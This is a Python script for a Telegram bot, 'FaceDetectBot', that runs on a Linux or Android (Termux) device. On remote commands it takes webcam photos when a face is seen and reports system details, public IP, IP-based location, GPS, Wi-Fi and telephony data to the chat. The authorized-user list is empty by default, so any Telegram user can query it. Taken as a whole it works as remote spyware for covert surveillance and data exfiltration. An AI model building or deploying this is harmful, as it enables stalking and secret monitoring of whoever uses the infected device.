import os
import cv2
import socket
import platform
import requests
import telepot
import subprocess
from datetime import datetime
import time

from dotenv import load_dotenv
import os

load_dotenv()
TOKEN = os.getenv("TELEGRAM_TOKEN")
# livefacecambot_facedetect.py

# === CONFIG ===
TOKEN = os.getenv("TELEGRAM_TOKEN")
# Your Telegram Bot Token
AUTHORIZED_USERS = []  # Optional
AUTO_FACE_CAPTURE = True  # Trigger on face or motion detection

bot = telepot.Bot(TOKEN)
face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')

def get_platform():
    if "com.termux" in os.getcwd() or os.path.exists("/data/data/com.termux/files"):
        return "android"
    return "linux"

def capture_image(platform_type):
    filename = f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
    if platform_type == "android":
        try:
            output = os.system(f"termux-camera-photo -c 0 {filename}")
            return filename if os.path.exists(filename) else None
        except:
            return None
    else:
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                faces = face_cascade.detectMultiScale(gray, 1.3, 5)
                if len(faces) > 0:
                    cv2.imwrite(filename, frame)
                    cap.release()
                    return filename
            cap.release()
            return None
        except:
            return None

def get_system_info():
    info = {
        "Platform": platform.platform(),
        "OS": platform.system(),
        "Version": platform.version(),
        "Architecture": platform.machine(),
        "Hostname": socket.gethostname()
    }
    try:
        info["Local IP"] = socket.gethostbyname(socket.gethostname())
        public_ip = subprocess.check_output("curl -s ifconfig.me", shell=True).decode()
        info["Public IP"] = public_ip.strip()
    except:
        info["Public IP"] = "N/A"
    return "\n".join(f"{k}: {v}" for k, v in info.items())

def get_geo_info():
    try:
        data = requests.get("http://ip-api.com/json").json()
        return f"""🌍 Location via IP:
Country: {data['country']}
Region: {data['regionName']}
City: {data['city']}
ISP: {data['isp']}
Lat/Lon: {data['lat']}, {data['lon']}"""
    except:
        return "❌ Could not retrieve geo-location info."

def get_android_info():
    try:
        battery = os.popen("termux-battery-status").read()
        device = os.popen("termux-telephony-deviceinfo").read()
        wifi = os.popen("termux-wifi-connectioninfo").read()
        location = os.popen("termux-location").read()
        return f"🔋 Battery:\n{battery}\n📶 Network:\n{wifi}\n📱 Device:\n{device}\n📍 GPS:\n{location}"
    except:
        return "❌ Unable to retrieve Android details."

def handle(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    user = msg['from']['id']
    text = msg.get('text', '').lower()

    if AUTHORIZED_USERS and user not in AUTHORIZED_USERS:
        bot.sendMessage(chat_id, "⛔ Unauthorized user.")
        return

    platform_type = get_platform()

    if text == "/start":
        bot.sendMessage(chat_id, "🤖 FaceDetectBot Ready.\nCommands:\n/photo - Capture if face\n/info - System info\n/geo - Location\n/battery - Android info")
        if AUTO_FACE_CAPTURE:
            img = capture_image(platform_type)
            if img:
                bot.sendMessage(chat_id, "👤 Face detected! Sending photo...")
                bot.sendPhoto(chat_id, photo=open(img, 'rb'))
                os.remove(img)

    elif text == "/photo":
        img = capture_image(platform_type)
        if img:
            bot.sendMessage(chat_id, "👤 Face detected! Sending photo...")
            bot.sendPhoto(chat_id, photo=open(img, 'rb'))
            os.remove(img)
        else:
            bot.sendMessage(chat_id, "❌ No face detected.")

    elif text == "/info":
        bot.sendMessage(chat_id, f"🖥️ System Info:\n{get_system_info()}")

    elif text == "/geo":
        bot.sendMessage(chat_id, get_geo_info())

    elif text == "/battery":
        if platform_type == "android":
            bot.sendMessage(chat_id, get_android_info())
        else:
            bot.sendMessage(chat_id, "⚠️ Only available on Android.")

    else:
        bot.sendMessage(chat_id, "❓ Unknown command. Try /start")

bot.message_loop(handle)
print("✅ FaceDetectBot is active and listening...")

while True:
    time.sleep(10)


